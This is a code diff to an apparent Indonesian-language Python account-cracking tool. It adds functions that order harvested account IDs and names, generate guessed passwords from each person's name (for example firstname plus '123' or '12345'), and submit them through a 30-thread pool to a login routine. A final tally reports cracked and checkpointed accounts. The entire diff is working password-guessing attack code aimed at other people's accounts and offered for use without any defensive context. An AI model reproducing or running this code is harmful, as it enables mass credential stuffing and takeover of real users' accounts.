@@ -1135,6 +1135,83 @@ def file_dump():
 		for idnyh in cekz_:
 			id.append(idnyh)
 		atur_duluh()
+def atur_duluh():
+	print(f'{xxx}─────────────────────────────')
+	print('└── 1. akun baru')
+	print('└── 2. akun acak')
+	aturidh = input(f'{xxx}└── : ')
+	if aturidh in ['1','01']:
+		xbaru=[]
+		for baru in sorted(id):
+			xbaru.append(baru)
+		bkp=len(xbaru)
+		bkpp=(bkp-1)
+		for miyabi in range(bkp):
+			id2.append(xbaru[bkpp])
+			bkpp -=1
+	elif aturidh in ['2','02']:
+		for acak in id:
+			xnxx = random.randint(0,len(id2))
+			id2.insert(xnxx,acak)
+	else:
+		baz_anim(f'{puti}└── {mer}pilih yang bener')
+		waktu(1)
+		atur_duluh()
+		exit()
+		
+	print(f'{xxx}─────────────────────────────')
+	print('└── enter untuk mulai crack')
+	print(f'{xxx}─────────────────────────────')
+	metodh = input(f'')
+	if metodh in ['',' ']:
+		xbz.append('metodh1')
+	else:
+		xbz.append('metodh1')
+	passwrdh()
+
+def passwrdh():
+	global prog,des
+	prog = Progress(SpinnerColumn('earth'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
+	des = prog.add_task('',total=len(id))
+	with prog:
+		with tred(max_workers=30) as gas_krek:
+			for aldous in id2:
+				idf,nmf = aldous.split('|')[0],aldous.split('|')[1].lower()
+				frs = nmf.split(' ')[0]
+				pwv = []
+				pwt = []
+				if len(nmf)<6:
+					if len(frs)<3:
+						pass
+					else:
+						pwv.append(frs+'321')
+						pwv.append(frs+'123')
+						pwv.append(frs+'1234')
+						pwv.append(frs+'12345')
+						pwv.append(frs+'123456')
+				else:
+					if len(frs)<3:
+						pwv.append(nmf)
+					else:
+						pwv.append(nmf)
+						pwv.append(frs+'321')
+						pwv.append(frs+'123')
+						pwv.append(frs+'1234')
+						pwv.append(frs+'12345')
+						pwv.append(frs+'123456')
+				if '><basari><' in pwt:
+					for xpwn in pwn:
+						pwv.append(xpwn)
+				else:pass
+				if 'metodh1' in xbz:
+					gas_krek.submit(metodh1,idf,pwv)
+				else:
+					gas_krek.submit(metodh1,idf,pwv)
+		yhg = '0'
+		print(f'{xxx}─────────────────────────────')
+		print(f'{hijo}+ {puti}akun ok : {hijo}%s{xxx} '%(ok))
+		print(f'{kun}+ {puti}akun cp : {kun}%s{xxx} '%(cp))
+		print(f'{xxx}─────────────────────────────')
 
 ###----------[ ATUR SBLUM KREK ]----------###
 def atur_dulu():
@@ -1162,7 +1239,6 @@ def atur_dulu():
 	else:
 		baz_anim(f'{puti}└──{mer} pilih yang bener')
 		waktu(1)
-		atur_dulu()
 		exit()
 		
 	print(f'{xxx}─────────────────────────────')
